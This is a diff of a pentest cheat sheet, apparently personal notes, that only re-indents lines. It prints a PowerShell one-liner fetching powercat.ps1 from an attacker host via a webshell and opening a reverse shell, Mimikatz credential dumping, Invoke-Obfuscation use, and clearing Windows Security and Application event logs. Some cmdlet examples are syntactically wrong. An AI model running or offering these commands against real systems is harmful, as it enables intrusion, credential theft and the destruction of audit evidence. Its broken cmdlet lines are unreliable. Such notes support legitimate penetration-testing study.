@@ -78,13 +78,13 @@ Or you can use PowerCat.ps1 script hosted and get your shell that way.
 
 Host your powercat files
 
-   python -m SimpleHTTPServer 8080
+   	python -m SimpleHTTPServer 8080
 
 Use your cmdasp.aspx webshell to force download and execution of powercat.ps1
 & get your reverse shell
 
-   powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString
-   ('http://10.10.10.1/powercat.ps1'));powercat -c 10.10.10.1 -p 4444 -ep"
+   	powershell.exe -nop -ep bypass -c "iex ((New-Object Net.WebClient).DownloadString
+   	('http://10.10.10.1/powercat.ps1'));powercat -c 10.10.10.1 -p 4444 -ep"
 
 
 So Once you've attained your shell you want the ability to get credentials and
@@ -96,34 +96,34 @@ This is the easiest way and often with windows 10 the only way that will work.
 Using PowerCat's Reverse shell, and running both the Import-Module & execute command
 inline, NOT SEPERATE!  Like so:
 
-   powershell Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -DumpCreds
+   	powershell Import-Module .\Invoke-Mimikatz.ps1; Invoke-Mimikatz -DumpCreds
 
-   powershell Import-Module .\Invoke-Obfuscation.psd1; Invoke-obfuscation
+   	powershell Import-Module .\Invoke-Obfuscation.psd1; Invoke-obfuscation
 
 
 
 PowerShell CHEATS (ALL WITH powershell prefix included)
 
-   stop-transcript                            Stops Recording
-   get-content <file>                         display file Contents
-   get-help <command> -Examples               shows examples of commands
-   get-command '<string>'                     searchs for cmd string
-   get-service                                displays services
-   get-wmiobject -class win32_service         alternate creds
-   $PSVersionTable                            display powershell version
-   -version 2.0                               run powershell 2.0
-   get-service | measure-object               returns # of services
-   get-psdrive                                returns list of psdrives
-   get-process | select -expandproperty name  returns only names
-   get-help * -parameter credential           cmdlets that take creds
-   get-wmiobject -list "network [Net.DNS]::GetHostEntry("<ip>")     dns lookup
+   	stop-transcript                            Stops Recording
+   	get-content <file>                         display file Contents
+   	get-help <command> -Examples               shows examples of commands
+   	get-command '<string>'                     searchs for cmd string
+   	get-service                                displays services
+   	get-wmiobject -class win32_service         alternate creds
+        $PSVersionTable                            display powershell version
+   	-version 2.0                               run powershell 2.0
+	get-service | measure-object               returns # of services
+   	get-psdrive                                returns list of psdrives
+   	get-process | select -expandproperty name  returns only names
+   	get-help * -parameter credential           cmdlets that take creds
+   	get-wmiobject -list "network [Net.DNS]::GetHostEntry("<ip>")     dns lookup
 
 Clear Security & Application Event Log for Remote Services
 
-   Get-EventLog -list
-   Clear-EventLog -logname Application, Security -computername SRV01
+   	Get-EventLog -list
+   	Clear-EventLog -logname Application, Security -computername SRV01
 
 List Running Services
 
-   Get-Service | where_object ($_.status -eq "Running")
+   	Get-Service | where_object ($_.status -eq "Running")
 
